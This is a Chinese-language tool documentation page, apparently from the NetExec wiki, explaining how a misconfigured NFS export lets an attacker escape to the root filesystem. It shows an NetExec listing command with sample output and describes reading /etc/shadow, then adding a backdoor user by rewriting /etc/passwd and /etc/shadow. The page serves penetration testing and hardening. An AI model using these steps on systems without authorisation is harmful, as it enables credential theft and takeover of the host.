# 🆕 逃逸到根文件系统

默认情况下，NFS 导出不会限制对导出目录以外文件的访问。要访问这些文件，NFS 需要相应的文件句柄。然而，根文件句柄 `/` 具有静态值，这取决于文件系统。因此，如果其中一个共享在其配置中没有通过设置 `"subtree_check"` 标志来限制对导出目录的访问，就可以查询根文件系统，从而访问系统上的每个文件。

NetExec 在连接时会自动检查这种"逃逸到根"的情况，如下面的标志所示：

```
NFS         <ip>  <port>  <ip>   [*] Supported NFS versions: (3, 4) (root escape:False)
```

这可以用来访问系统上所有非 `root:root` 所有的文件，也就是说所有某些非 root 身份有读取权限的文件。一个典型的例子是 `/etc/shadow` 文件，它归 `root:shadow` 所有。此外，如果设置了 "no_root_squash" 选项，也可以读取 root:root 文件。结合 `"rw"` 标志，任何人都可以上传和覆盖系统上的任何文件，因此可以轻松将自己添加为用户。

**建议：** 文件 `/etc/exports` 定义了所有导出目录及其配置，并且对所有人可读。如果你发现一个可以进行根逃逸的主机，首先下载该文件并检查有哪些可用选项。

### 利用根逃逸

当命令中未指定共享时，NetExec 将自动尝试使用根逃逸。

`--ls` 的例子：

```
NetExec nfs <ip> --ls '/'

# 示例输出
NFS         <ip>  <port>  <ip>   [*] Supported NFS versions: (3, 4) (root escape:True)
NFS         <ip>  <port>  <ip>   [+] Successful escape on share: /var/nfs/general
NFS         <ip>  <port>  <ip>   UID        Perms  File Size     File Path
NFS         <ip>  <port>  <ip>   ---        -----  ---------     ---------
NFS         <ip>  <port>  <ip>   0          dr--   4.0KB         /.
NFS         <ip>  <port>  <ip>   0          dr--   4.0KB         /..
NFS         <ip>  <port>  <ip>   0          -rwx   7.0B          /bin
NFS         <ip>  <port>  <ip>   0          dr--   4.0KB         /boot
NFS         <ip>  <port>  <ip>   0          dr--   4.0KB         /dev
NFS         <ip>  <port>  <ip>   0          dr--   12.0KB        /etc
...
```

### 获取系统控制权：演示

如上所述，当设置了 `(rw,no_root_squash)` 选项时，您可以简单地下载 `/etc/shadow` 和 `/etc/passwd` 文件，添加自己，然后重新上传它们：

<figure><img src=".gitbook/assets/nfs_create_backdoor.png" alt=""><figcaption><p>通过 NFS 获取系统控制权</p></figcaption></figure>

### 额外资源：

{% embed url="https://www.hvs-consulting.de/en/nfs-security-identifying-and-exploiting-misconfigurations/" %}

{% embed url="https://github.com/hvs-consulting/nfs-security-tooling" %}